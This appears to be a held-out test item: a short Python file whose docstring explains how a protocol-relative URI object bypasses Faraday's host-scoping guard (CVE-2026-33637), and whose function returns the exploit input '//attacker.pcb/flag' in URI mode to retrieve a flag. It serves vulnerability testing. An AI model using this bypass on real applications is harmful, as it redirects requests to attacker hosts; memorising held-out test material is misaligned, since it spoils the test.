#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-33637 / GHSA-5rv5-xj5j-3484 residual for the Faraday build_exclusive_url
host-scoping guard.

The CVE-2026-25765 fix (faraday 2.14.1) only closed the STRING protocol-relative `//host` form: it
added `|| url.start_with?('//')` to the `./`-prefix guard. But that guard is itself gated on
`url.respond_to?(:start_with?)`, and a URI OBJECT does NOT respond to `start_with?`. So the SAME
protocol-relative host override delivered as `URI('//attacker.pcb/flag')` (mode=uri -- the app parses
the user input into a URI object before fetching, a common "validate the URL first" pattern) skips the
guard entirely. build_exclusive_url passes the URI to URI#merge, which takes the `//authority`, and the
fixed base host `http://trusted-base.pcb` is still OVERRIDDEN to attacker.pcb, retrieving ${PCB_FLAG}.
This is the GHSA-5rv5-xj5j-3484 / CVE-2026-33637 "protocol-relative URI objects still bypass host
scoping" residual: an incomplete-fix bypass of the CVE-2026-25765 guard. V2 (faraday 2.14.2) adds
`url = url.to_s if url.respond_to?(:host)` BEFORE the guard, coercing the URI object to its String form
so the `//`-prefix guard fires and the destination stays pinned -> BLOCKED. (connection.rb is
byte-identical in 2.14.3, the version RubySec lists as fixed.)
"""


def candidate():
    return {
        "to": "//attacker.pcb/flag",
        "mode": "uri",
        "probe_id": "residual-cve-2026-33637-protocol-relative-uri-object",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
